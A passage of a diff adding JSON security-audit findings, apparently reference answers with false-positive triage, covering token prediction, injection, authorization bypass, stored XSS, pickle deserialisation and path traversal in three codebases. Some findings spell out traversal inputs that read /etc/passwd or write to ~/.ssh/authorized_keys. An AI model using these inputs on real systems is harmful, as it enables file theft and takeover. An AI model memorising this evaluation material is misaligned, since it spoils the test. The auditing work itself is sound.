+      "evidence": "newShareToken draws 12 characters from a 33-character alphabet using Math.floor(Math.random() * alphabet.length). The function's own comment describes the token as the handle that lets a household member 'pull up the delivery window without signing in', so it is a bearer capability. Math.random in V8 is xorshift128+, whose internal state is recoverable from a modest number of observed outputs, after which past and future values are computable.",
+      "impact": "An attacker who collects a few share tokens (any customer can mint their own by creating orders) can recover the generator state and derive other customers' tokens, gaining sign-in-free access to their order details.",
+      "recommendation": "Use crypto.randomBytes or crypto.randomUUID and encode to the URL-safe alphabet.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "HOLDS",
+          "reason": "Rule 08 applies in the finding's favour: use of a fundamentally unsuitable primitive for a security value is an intrinsic flaw of the function."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Math.random is not a safe standard primitive being held to an unreasonable standard; it is documented as unsuitable for security purposes."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "State recovery from xorshift128+ output is a published, automatable technique, not an unstable timing dependency."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "pantry-portal/server/utils/db.ts:40"
+        ],
+        "established_by": "Grepped newShareToken: its only caller is insertOrder (db.ts:74), and the value is returned to clients at index.post.ts:30 and [id].get.ts:19.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "countByStatus builds its WHERE clause by string interpolation",
+      "location": {
+        "path": "pantry-portal/server/utils/db.ts",
+        "symbol": "countByStatus",
+        "line": 56
+      },
+      "class": "SQL injection (latent sink)",
+      "severity": "low",
+      "status": "probable",
+      "evidence": "The query embeds ${status} inside a single-quoted literal while every other statement in this module uses $1-style placeholders. The function signature accepts a bare string, so the safety of the call is entirely a property of the caller, not of the function.",
+      "impact": "No injectable value reaches it today. If a second caller is added that does not pre-validate \u2014 for example an admin filter or a reporting endpoint \u2014 the function injects immediately, and its permissive signature invites exactly that.",
+      "recommendation": "Bind the parameter: query('... WHERE status = $1', [status]). This costs nothing and removes the dependence on caller discipline.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "HOLDS",
+          "reason": "Rule 08 applies in the finding's favour: the injection path is in the function's own logic, so it remains reportable regardless of what the current callers pass."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Rule 13's explicit exception for Rule 08 intrinsic flaws applies; no attacker-controlled ingress is claimed and the severity is set to low to reflect that."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "Not reproducible against the current call graph. Reported as a latent sink with low severity rather than asserted as triggerable."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "pantry-portal/server/utils/db.ts:56"
+        ],
+        "established_by": "Grepped countByStatus across the corpus: one definition and one call site ([id].patch.ts:17). Read that call site to see what narrows the argument.",
+        "narrowed_by": "The single caller passes patch.status, already narrowed to the six-value enum declared at schemas.ts:3 and enforced by orderPatchSchema.parse at [id].patch.ts:10, so no metacharacter can reach the template today."
+      }
+    },
+    {
+      "title": "Shoppers can move their own order to the paid state",
+      "location": {
+        "path": "pantry-portal/server/api/orders/[id].patch.ts",
+        "symbol": "LOCKED_STATUSES check",
+        "line": 12
+      },
+      "class": "Business logic authorization flaw",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "LOCKED_STATUSES blocks out_for_delivery, delivered and cancelled, leaving draft, scheduled and packing settable by the customer. 'scheduled' is the state the billing webhook assigns on charge.succeeded (webhook.post.ts:42), so it denotes a paid order. The patch handler applies no payment check before letting a customer set it.",
+      "impact": "A customer creates a draft order and PATCHes status to 'scheduled', reaching the same state a successful charge would produce without any charge occurring. Downstream fulfilment that keys on status ships the box.",
+      "recommendation": "Do not let customers write status at all; expose intent-specific actions (cancel, reschedule) and let the payment pipeline own the paid transition.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The status value comes from the request body parsed at [id].patch.ts:10 and is written to the row through updateOrder at line 19."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The gap is in the handler's own allow-list, not in a hypothetical caller passing something odd."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "Marked probable rather than confirmed: the fulfilment consumer that acts on 'scheduled' is not part of this corpus, so the downstream effect is inferred from the webhook's use of the same value."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "pantry-portal/server/api/orders/[id].patch.ts:5",
+          "pantry-portal/server/api/orders/[id].patch.ts:12"
+        ],
+        "established_by": "Compared the six enum values at schemas.ts:3 against the three names in LOCKED_STATUSES, then grepped for every writer of orders.status to see which states are meant to be system-assigned.",
+        "narrowed_by": "The caller must own the order: updateOrder scopes the UPDATE on customer_id at db.ts:107, so this changes only the attacker's own orders."
+      }
+    },
+    {
+      "title": "Patient-scope guard compares against a path prefix the app never serves",
+      "location": {
+        "path": "labtrack/labtrack/guards.py",
+        "symbol": "require_patient_scope",
+        "line": 72
+      },
+      "class": "Authorization control never executes",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The guard returns immediately unless connection.scope['path'] starts with '/api/results'. The application mounts every handler under path='/api/v1' (app.py:44) and ResultsController declares path='/results' (results.py:30), so the ASGI path is '/api/v1/results/...'. The same file already knows this: the auth middleware and the rate limiter both exclude '/api/v1/oauth' with the version segment present (app.py:22 and :29). The prefix at guards.py:72 is the only place that omits it, so the guard body \u2014 the results:read scope check at line 76 and the care-link check at line 80 \u2014 is dead for every request.",
+      "impact": "Two controls silently do nothing. Any valid bearer token reads results regardless of whether its client is registered for results:read (a billing-sync token, registered for reports:read only, passes), and the care-link restriction that limits an operator to their own patients never applies, so any operator reads any patient in the organisation.",
+      "recommendation": "Match on the mounted path ('/api/v1/results') or, better, attach the guard to ResultsController itself so the routing layer decides applicability instead of a string literal.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Coherence verified across three files: the app prefix (app.py:44), the controller prefix (results.py:30) and the literal being compared (guards.py:72). All exist at the cited lines."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "These are the primary scope and care-link authorization checks for clinical results, not defence in depth."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Assessed pragmatically rather than assumed broken: the guard's body is correct and would enforce properly \u2014 it is the applicability predicate that is wrong, so nothing downstream compensates."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "labtrack/labtrack/guards.py:72"
+        ],
+        "established_by": "Composed the served path from Litestar's app-level path kwarg and the controller path, then compared it with every path literal in the module. app.py:22 and app.py:29 both use the '/api/v1' form, which isolates guards.py:72 as the outlier.",
+        "narrowed_by": "Per-row organisation scoping still applies on two of the three routes \u2014 results.py:54 checks ordering_org for a single result and store.py:39 filters by ordering_org for the patient listing \u2014 so the residual exposure is scope enforcement and intra-organisation care links, plus the panel route which has no organisation filter at all."
+      }
+    },
+    {
+      "title": "Report cache is read before the ownership check",
+      "location": {
+        "path": "labtrack/labtrack/controllers/reports.py",
+        "symbol": "ReportsController.report",
+        "line": 23
+      },
+      "class": "Authorization bypass via cache",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The handler calls render.cached_report(result_id) and returns the cached HTML at line 25, before the row is loaded and its ordering_org compared with the caller's organisation at line 28. The cache key is derived solely from result_id (render.py:41), so it carries no organisation component.",
+      "impact": "Once an authorised viewer renders a report, any other authenticated caller who supplies the same result_id receives the full report HTML \u2014 patient identifier, panel, values and clinician comment \u2014 without the ownership check ever running. This is a direct PHI disclosure across organisations.",
+      "recommendation": "Load the row and enforce the ordering_org check first, then consult the cache; or include the organisation in the cache key so a mismatch simply misses.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "result_id arrives from the path parameter at reports.py:21-22 and selects the cache entry directly."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No race is required \u2014 the cache entry persists for the configured TTL and the request can be repeated at will."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The ownership check at line 28 is correct and is not being second-guessed; the finding is that control flow can return before reaching it."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "labtrack/labtrack/controllers/reports.py:23"
+        ],
+        "established_by": "Read the handler top to bottom to establish statement order, then read render.py:40-50 to confirm the cache key contains only a hash of result_id and no organisation component.",
+        "narrowed_by": "The attacker must name a result_id that another organisation has already had rendered, and the entry must still be live within the report TTL (settings.py:19, default 600 seconds)."
+      }
+    },
+    {
+      "title": "Path traversal in the attachment download handler",
+      "location": {
+        "path": "labtrack/labtrack/controllers/reports.py",
+        "symbol": "ReportsController.attachment",
+        "line": 37
+      },
+      "class": "Path traversal / arbitrary file read",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The route parameter is declared {name:path}, which in Litestar accepts slashes, and the handler joins it to the attachment root after only name.lstrip('/'). lstrip removes leading slashes but not '..' segments, and pathlib's / operator performs no containment check, so 'a/../../../../etc/passwd' resolves outside the root. The file is then read with target.read_bytes() and returned in the response body.",
+      "impact": "Any caller with a valid bearer token reads arbitrary files readable by the service account \u2014 configuration, the token signing key if it is file-backed, other patients' attachments \u2014 served with a content-disposition header derived from the traversed name.",
+      "recommendation": "Resolve the candidate and verify containment before opening it: check that Path(root).resolve() is among target.resolve().parents, and reject anything else with a 404.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The ingress is the {name:path} route parameter bound at reports.py:35-36; it reaches the filesystem locator with only lstrip applied."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The one mitigation present (lstrip('/')) was examined rather than dismissed: it defeats absolute paths but not relative traversal, so it does not block the class."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "A single GET reproduces it; no timing or grooming is involved."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "labtrack/labtrack/controllers/reports.py:37"
+        ],
+        "established_by": "Read the route declaration to confirm the :path converter permits separators, then traced the value through lstrip into the pathlib join and the read_bytes call.",
+        "narrowed_by": "A valid bearer token is required: the auth middleware excludes only '/health' and '/api/v1/oauth' (app.py:22), so anonymous callers are still rejected before reaching the handler."
+      }
+    },
+    {
+      "title": "Panel recency endpoint returns results from every organisation",
+      "location": {
+        "path": "labtrack/labtrack/services/store.py",
+        "symbol": "recent_by_panel",
+        "line": 54
+      },
+      "class": "Cross-tenant data exposure",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The query filters on panel_code alone. Unlike results_for_patient, which requires ordering_org = $2 (store.py:39), and unlike raw_result, whose callers apply their own organisation check (results.py:54, reports.py:28), this statement has no organisation predicate and its caller at results.py:42-49 adds none. The columns returned include patient_id, value_json and comment.",
+      "impact": "Any authenticated caller retrieves up to 500 recent results for a chosen assay across every organisation in the network, with patient identifiers and values attached \u2014 a bulk PHI read that no organisation boundary constrains.",
+      "recommendation": "Add ordering_org = $2 to the statement and pass request.scope['user']['org_id'] from the controller, matching results_for_patient. If a genuine cross-site analytics view is required, serve it de-identified and behind a distinct scope.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "panel_code arrives as a path parameter at results.py:42-44 and selects the rows returned; the missing predicate is what widens the result set beyond the caller's organisation."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The omission is in the query itself, not a consequence of a caller passing something unexpected."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is the absence of the tenancy predicate on a PHI read, not a missing hardening measure."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "labtrack/labtrack/services/store.py:54",
+          "labtrack/labtrack/controllers/results.py:42"
+        ],
+        "established_by": "Compared the WHERE clause of every SELECT in store.py against its counterparts; recent_by_panel is the only read that omits ordering_org, and its controller adds no compensating check.",
+        "narrowed_by": "A panel_code must be supplied, but these are shared reference-lab assay codes rather than secrets, so this is not a meaningful barrier."
+      }
+    },
+    {
+      "title": "Report comment is rendered unescaped and the bulk import path does not sanitise it",
+      "location": {
+        "path": "labtrack/labtrack/services/render.py",
+        "symbol": "render_report",
+        "line": 36
+      },
+      "class": "Stored cross-site scripting",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "render_report escapes title, collected, resulted and every cell in _rows, but passes result['comment'] into the template raw at line 36. The single-result create path sanitises with bleach against a tag allow-list (results.py:65), but bulk_import writes row.get('comment', '') directly with no cleaning (store.py:98). The report is served with media_type='text/html' (reports.py:21).",
+      "impact": "A caller holding a write scope posts a batch through POST /api/v1/results/import containing a script payload in a comment; anyone who later opens that result's report executes it in the origin of the clinical portal, where their bearer token and other patients' data are reachable.",
+      "recommendation": "Escape at the sink (wrap the comment in html.escape or render it through bleach at render time) and apply the same bleach.clean to comments in bulk_import, so neither writer can bypass sanitisation.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The ingress is the request body parsed into `data: list[dict]` at results.py:72 and passed to bulk_import at line 73; the comment field flows to the unescaped interpolation unchanged."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The bleach mitigation on the create path is real and was credited; the finding is confined to the second writer, which was located by enumerating every INSERT into results.comment."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The location is the sink line; the unsanitised writer is carried in scope rather than inflating the primary path."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "labtrack/labtrack/services/render.py:36",
+          "labtrack/labtrack/services/store.py:98"
+        ],
+        "established_by": "Read the template interpolations one by one to find the single unescaped slot, then enumerated both INSERT statements that populate results.comment (store.py:84 via insert_result, store.py:98 via bulk_import) to see which sanitises.",
+        "narrowed_by": "Comments written through POST /api/v1/results/ are cleaned by bleach at results.py:65, so only rows loaded through /results/import carry live markup to the sink."
+      }
+    },
+    {
+      "title": "Panel definitions are deserialised from the cache with pickle",
+      "location": {
+        "path": "labtrack/labtrack/services/store.py",
+        "symbol": "cached_panel_definition",
+        "line": 127
+      },
+      "class": "Unsafe deserialisation",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "cached_panel_definition retrieves a blob from Redis keyed by panel code and passes it to pickle.loads. pickle executes constructor callables embedded in the stream, so anything able to write that key achieves code execution in the worker. The same Redis instance also holds the rendered report cache (render.py:50), so it is not a dedicated, isolated store.",
+      "impact": "An attacker with write access to the Redis instance \u2014 through a misconfigured bind, a shared cache, or any other injection into that keyspace \u2014 executes arbitrary code inside the API process, which holds the database credentials and the token signing key.",
+      "recommendation": "Serialise with JSON and encode Decimals explicitly, or sign the blob with the existing HMAC key and verify before unpickling.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "HOLDS",
+          "reason": "Rule 08 applies in the finding's favour: an unsafe deserialisation primitive is an intrinsic flaw of the function, reportable even though nothing calls it in this corpus."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Rule 13's exception for Rule 08 intrinsic flaws applies, so no HTTP ingress needs to be traced; the severity is held at medium to reflect the indirect reach."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "NOT_APPLICABLE",
+          "reason": "The file is a production service module; no test or mock path is involved."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "labtrack/labtrack/services/store.py:127"
+        ],
+        "established_by": "Grepped cached_panel_definition and store_panel_definition across the corpus: both are defined here and neither is called, so the only reachable route is through the cache key itself.",
+        "narrowed_by": "No call site exists in this corpus, and reaching it requires write access to the Redis instance configured at settings.py:16, not merely an API request."
+      }
+    },
+    {
+      "title": "Token endpoint is excluded from rate limiting",
+      "location": {
+        "path": "labtrack/labtrack/app.py",
+        "symbol": "rate_limit_config",
+        "line": 29
+      },
+      "class": "Missing brute-force protection on authentication",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "RateLimitConfig excludes '/health' and '/api/v1/oauth'. The excluded prefix covers TokenController (tokens.py:38), whose POST /token performs the username and password verification at tokens.py:44-56. The comment at app.py:24-26 records that the exclusion was added to stop refresh storms, so it is deliberate, but it removes the only attempt limiter from the credential-checking endpoint.",
+      "impact": "An attacker can submit unlimited password guesses per client_id and username with no throttling, lockout or backoff anywhere in the request path. Success yields a bearer token whose claims include org_id, role and care_links.",
+      "recommendation": "Apply a distinct, stricter limit keyed on username and source address to the token route rather than exempting it, and add failure counting with progressive backoff.",
+      "triage": [
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a resource-exhaustion complaint. The stated harm is credential guessing against an authentication endpoint, which Rule 07 does not cover."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rate limiting on the credential endpoint is the control being removed here, not an additional header or hardening nicety; the surrounding configuration shows the project treats it as a real control everywhere else."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The untrusted input is the unauthenticated request body bound to TokenRequest at tokens.py:42; no prior gate stands in front of it."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "labtrack/labtrack/app.py:29"
+        ],
+        "established_by": "Matched the two excluded prefixes against every mounted route: '/api/v1/oauth' resolves to TokenController and nothing else; all other routes remain limited at 120/minute.",
+        "narrowed_by": "Argon2 verification cost imposes a natural per-attempt delay, which slows but does not bound the number of attempts."
+      }
+    },
+    {
+      "title": "Sidekiq Web console is mounted as unauthenticated middleware",
+      "location": {
+        "path": "dispatch-workers/config/initializers/sidekiq.rb",
+        "symbol": "Sidekiq::Web middleware mount",
+        "line": 34
+      },
+      "class": "Missing authentication on an administrative interface",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "Sidekiq::Web is inserted into the Rack middleware stack at '/internal/queues' with no guard. Rack middleware runs ahead of the Rails router, so the authenticate :user, ->(user) { user.platform_admin? } block that protects the other mount at routes.rb:18-20 does not apply to it. Line 30 also sets Sidekiq::Web sessions to false, which disables the CSRF protection Sidekiq 7 derives from the session.",
+      "impact": "Anyone who can reach the application on that path gets the full queue console: reading job arguments (which for the partner bridge carry org identifiers and HMAC material), retrying, killing and deleting jobs, and clearing queues. With sessions disabled, the destructive POST endpoints are also reachable by cross-site request from an operator's browser.",
+      "recommendation": "Remove the middleware mount and keep only the router-mounted, authenticated one at routes.rb:19; if an unauthenticated in-cluster view is genuinely needed, terminate it behind an authenticating proxy and leave sessions enabled.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not a local-only test function. It is a production administrative UI with mutating actions, mounted into the running application's middleware stack."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The mitigation that does exist was checked and credited: routes.rb:18-20 correctly guards the /ops/sidekiq mount. The finding is that a second mount exists outside the router where that guard cannot reach."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Both mounts were read directly \u2014 sidekiq.rb:34 and routes.rb:19 \u2014 and the middleware-versus-router distinction is a property of Rack, not an inference about the code."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "dispatch-workers/config/initializers/sidekiq.rb:34",
+          "dispatch-workers/config/initializers/sidekiq.rb:30"
+        ],
+        "established_by": "Grepped Sidekiq::Web across the project and found exactly two mounts; compared the guard around each. The router mount is inside an authenticate block, the middleware mount is not.",
+        "narrowed_by": "The comment at sidekiq.rb:32-33 asserts the path is reached only from inside the cluster, but nothing in the code enforces that \u2014 no network policy, host constraint or auth check appears anywhere in the corpus."
+      }
+    },
+    {
+      "title": "update_role! applies no granting ceiling",
+      "location": {
+        "path": "dispatch-workers/app/models/invite_policy.rb",
+        "symbol": "InvitePolicy.update_role!",
+        "line": 37
+      },
+      "class": "Privilege escalation / missing authorization",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "update_role! validates only that the role name is a member of ROLES, then writes it. It takes no actor argument, so the CEILING table at lines 11-16 \u2014 which invite! consults at line 23 to ensure a grantor sits at or above the role being granted \u2014 cannot be applied. ROLES includes both 'owner' and 'platform_admin', and the class comment at lines 3-5 asserts that both entry points go through invite! so the ceiling is applied once.",
+      "impact": "Any path that reaches update_role! can set a membership to owner or platform_admin. InboundEventWorker calls it with payload['role'] straight off a partner event (inbound_event_worker.rb:17), so a partner event promotes an arbitrary member of that organisation to platform administrator.",
+      "recommendation": "Give update_role! an actor parameter and apply the same CEILING.fetch check invite! uses, and exclude platform_admin from anything grantable from inside an organisation.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The role value is attacker-influenced: it enters as payload['role'] on an inbound partner event and is passed unmodified at inbound_event_worker.rb:17."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The missing check is inside this method, which is documented as the shared enforcement point; the caller is behaving as designed."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "invite! is a working mitigation and is not being stretched; the finding is that the sibling entry point never invokes it."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "dispatch-workers/app/models/invite_policy.rb:37"
+        ],
+        "established_by": "Read both entry points side by side: invite! performs four checks (role validity, ceiling, verified domain, seat limit); update_role! performs one. Grepped update_role! to find its single caller.",
+        "narrowed_by": "On the signed HTTP path the value is first narrowed to viewer|dispatcher|supervisor by the dry-schema at signed_payload.rb:21. Jobs pushed straight onto the partner_bridge queue (sidekiq.yml:9-11) bypass that schema entirely, so the narrowing does not hold on the queue path."
+      }
+    },
+    {
+      "title": "Bulk invite worker writes memberships without going through InvitePolicy",
+      "location": {
+        "path": "dispatch-workers/app/workers/bulk_invite_worker.rb",
+        "symbol": "BulkInviteWorker#perform",
+        "line": 35
+      },
+      "class": "Privilege escalation / bypassed policy",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The row loop assigns membership.role = role and saves, having checked only that the name appears in InvitePolicy::ROLES (line 32). It never calls InvitePolicy.invite!, so three of that method's four checks are skipped: the CEILING ceiling (invite_policy.rb:23), the verified-domain restriction (line 27) and the seat limit (line 29). ROLES contains 'platform_admin', which the policy comment at invite_policy.rb:10 says nobody may hand out from inside an organisation.",
+      "impact": "An organisation owner uploads a CSV containing their own address with role 'platform_admin' and is promoted beyond the ceiling their own role allows. The same upload seats members at unverified email domains and exceeds the paid seat limit.",
+      "recommendation": "Replace the inline assignment with InvitePolicy.invite!(actor:, org:, email:, role:) per row and let Denied surface as a skipped row, so the policy really is the single decision point its comment claims.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The rows arrive as job arguments originating from an operator-supplied CSV upload, as the worker's own comment at lines 3-5 states, and the role value is read from each row at line 31."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No hypothetical misuse is required: the worker itself omits the checks, and the documented invariant is stated in the policy class it declines to call."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "HOLDS",
+          "reason": "Rule 06 applied in the finding's favour: the dev-only grant_without_checks! branch at line 20 was traced rather than assumed, and found genuinely unreachable in production, which is why it is listed under ruled_out and this separate live path is reported instead."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "dispatch-workers/app/workers/bulk_invite_worker.rb:35"
+        ],
+        "established_by": "Diffed the checks performed by InvitePolicy.invite! (invite_policy.rb:20-32) against those performed in the worker loop (lines 28-38); three of four are absent.",
+        "narrowed_by": "The actor must be an owner of the target organisation (line 17), so this escalates an owner to platform_admin rather than granting an outsider entry."
+      }
+    },
+    {
+      "title": "Job argument signature verification is off by default and skipped when the field is absent",
+      "location": {
+        "path": "dispatch-workers/lib/signed_payload.rb",
+        "symbol": "SignedPayload::JobSignatureMiddleware#call",
+        "line": 58
+      },
+      "class": "Authentication bypass (fail-open, two ways)",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The middleware verifies only when the payload hash contains a '_sig' key; a payload without that key falls straight through to yield with no verification. The middleware is also only added to the chain when SIDEKIQ_VERIFY_ARGS equals 'on', and sidekiq.rb:11 defaults that variable to 'off'. Both gates default open, and the second one cannot be closed by configuration because omitting the field defeats it even when verification is enabled.",
+      "impact": "Anything able to enqueue on the partner_bridge queue reaches InboundEventWorker with a fully attacker-authored payload and no schema and no signature. That payload drives the role change at inbound_event_worker.rb:17 and the organisation settings write at line 22.",
+      "recommendation": "Add the middleware unconditionally and invert the predicate: require '_sig' on every job on the partner queues and raise when it is missing, rather than treating its absence as consent.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The untrusted writer is whoever can push to the Redis queue; sidekiq.yml:9-11 documents that the partner bridge writes jobs directly with the Sidekiq client protocol, so the queue is an ingress, not internal state."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The HMAC helpers themselves were checked and are sound \u2014 verify! uses OpenSSL.secure_compare at line 38. The finding is the applicability predicate around them, not the comparison."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is the authenticity control for the queue ingress, not an additional layer."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "dispatch-workers/lib/signed_payload.rb:58",
+          "dispatch-workers/config/initializers/sidekiq.rb:11"
+        ],
+        "established_by": "Read the middleware body to establish that the guard is a key-presence test, then traced how it is registered (sidekiq.rb:17) and what the flag defaults to (sidekiq.rb:11).",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "Partner event applies an arbitrary settings hash to the org record",
+      "location": {
+        "path": "dispatch-workers/app/workers/inbound_event_worker.rb",
+        "symbol": "InboundEventWorker#perform (org.settings_updated)",
+        "line": 22
+      },
+      "class": "Mass assignment",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The handler calls org.update!(payload['org_settings']) with the hash exactly as it arrived. ActiveRecord's update! assigns every key present, so the writable attribute set is the Org model's, not the two keys the schema contemplates. The comment at lines 20-21 states the assumption that the block 'is already in the shape our Org model expects', which is true only on the HTTP path.",
+      "impact": "A payload placed on the partner_bridge queue can rewrite any Org column \u2014 the verified_domains list that gates invitations (invite_policy.rb:27), the seat_limit, and the bridge_secret and webhook_secret that authenticate the partner channel and sign outbound webhooks.",
+      "recommendation": "Permit an explicit key list before assigning: org.update!(payload['org_settings'].slice('retention_days', 'timezone')), and keep secret-bearing columns out of any update path driven by input.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The payload is the job argument, and sidekiq.yml:9-11 plus the worker's own comment establish the queue as a partner-writable ingress."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The worker itself performs the unrestricted assignment; no caller misuse is postulated."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "update! is not a safe library call being nitpicked \u2014 it is being handed an unfiltered hash, which is exactly the misuse the Rails strong-parameters pattern exists to prevent."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "dispatch-workers/app/workers/inbound_event_worker.rb:22"
+        ],
+        "established_by": "Read all three branches of the case statement; this is the only one that writes a caller-supplied hash rather than named fields, and it is the only ActiveRecord update in the file that does not name its columns.",
+        "narrowed_by": "On the signed HTTP path Dry::Schema output at signed_payload.rb:24-27 emits only retention_days and timezone, so that route is already constrained. The narrowing does not apply to jobs enqueued directly onto partner_bridge."
+      }
+    },
+    {
+      "title": "Manifest render worker writes the PDF to a caller-named path",
+      "location": {
+        "path": "dispatch-workers/app/workers/manifest_render_worker.rb",
+        "symbol": "ManifestRenderWorker#perform",
+        "line": 26
+      },
+      "class": "Path traversal / arbitrary file write",
+      "severity": "high",
+      "status": "probable",
+      "evidence": "filename is taken from args['filename'] with no validation (line 18) and joined to the spool directory with Pathname#join (line 26). Pathname#join discards the base entirely when the argument is absolute, and follows '..' segments when it is relative. The result is passed to FileUtils.mkdir_p(File.dirname(target)) at line 27, which creates any intermediate directories, and then to Prawn::Document.generate, which writes there.",
+      "impact": "A job argument such as '/home/deploy/.ssh/authorized_keys' or '../../config/initializers/evil.rb' causes the worker to create the parent directory and write a file it controls the name and location of, as the application user. PDF bytes are attacker-influenced through the manifest reference and stop rows rendered into the document.",
+      "recommendation": "Ignore the supplied name for the path: derive the filename from the manifest id, or sanitise with File.basename and verify that target.expand_path is inside SPOOL.expand_path before writing.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The value is a job argument. Per sidekiq.yml, queues are fed by the application and, for the partner path, by an external writer; either way the argument is not server-authored static configuration."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "There is no containment mitigation to credit: the only processing applied to the name is .presence, which checks for blankness, not for traversal."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "Marked probable rather than confirmed because the enqueuing controller (manifests#create, referenced at routes.rb:11) is not part of this corpus, so how much of the args hash a web caller controls could not be read."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "dispatch-workers/app/workers/manifest_render_worker.rb:26"
+        ],
+        "established_by": "Traced args['filename'] from line 18 through the Pathname join at line 26 into the mkdir_p and the Prawn write; no containment check appears on that path.",
